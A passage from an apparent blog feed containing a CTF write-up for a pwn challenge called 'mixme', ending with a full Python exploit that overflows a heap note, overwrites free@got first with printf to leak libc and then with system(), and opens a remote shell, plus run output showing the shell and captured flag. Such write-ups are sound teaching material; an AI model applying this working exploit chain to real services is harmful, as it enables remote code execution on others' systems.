libc-2.19-13ubuntu3.so

00472a0: 0489 3424 e877 9c02 0083 c001 758a e9d1  ..4$.w......u...
0047a00: 0000 8934 24e8 1695 0200 83c0 0175 c5e9  ...4$........u..
0050e40: 8904 24e8 6879 0100 83c0 0175 b8e9 04cc  ..$.hy.....u....
0051990: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
0066100: 1cae 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
</code></pre>

<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>

<pre><code>0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
</code></pre>

<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<pre><code class="bash">LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
</code></pre>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>

<pre><code class="python">import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('&lt;L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

# the third note will hold our format string
z(s, "store")
z(s, "c")
format_str = "--%3$x"
z(s, str(len(format_str)))
z(s, format_str)

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, p(0x080485f0)) # free@got overwritten with printf

# now 'get' c and trigger the format string vulnerability
print "[+] triggering format string"
z(s, "get")
z(s, "c")
data = z(s, str(len(format_str)))
time.sleep(0.1)

# this proved to be a bit finicky:
data += s.recv(256)
data += s.recv(256)

print data
# grab leaked libc address
m = re.findall(r'x--(.*)cSel', data)
if m: 
    print m
    leak = "0x"+m[0]
    leak_hex = int(leak, 16)
    print "[+] found first addr: {}".format(hex(leak_hex))
    system = leak_hex - 155428
    print "[+] system @ {}".format(hex(system))

# repeat the same trick, but this time, overwrite free@got with system()
# first note contains /bin/sh, used as argument for system()
z(s, "store")
z(s, "sh")
z(s, "7")
z(s, "/bin/sh")

z(s, "store")
z(s, "t")
z(s, "4")
z(s, "TTTT")

z(s, "store")
z(s, "q")
z(s, "4")
z(s, "QQQQ")

print "[+] overflowing t to set q to free@got"
z(s, 'edit')
z(s, 't')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x71\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow              ^ restore 'q'           ^ size of q  ^ free@got

print "[+] replacing free() with system()"
z(s, 'edit')
z(s, 'q')
z(s, '4')
z(s, p(system))     # free@got overwritten with system

# trigger system('/bin/sh')
z(s, 'get')
z(s, 'sh')  # this note contains '/bin/sh' and those contents are passed to system()
z(s, '7')

# shell spawned, interact with it!
t=telnetlib.Telnet()
t.sock=s
t.interact()

s.close()
</code></pre>

<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>

<pre><code class="bash">root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
[+] overflowing a to set b to free@got
[+] replacing free() with printf()
[+] triggering format string
Name: Size: --%3$x--b768d024cSelect op (store/get/edit/exit): 
['b768d024']
[+] found first addr: 0xb768d024L
[+] system @ 0xb7667100L
[+] overflowing t to set q to free@got
[+] replacing free() with system()
/bin/sh
id
uid=1005 gid=1005 groups=0
cat flag.txt
aw3s0m3++_hipp1e_pwn_r0ckst4r
</code></pre>

<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
]]></content>
  </entry>
  
</feed>
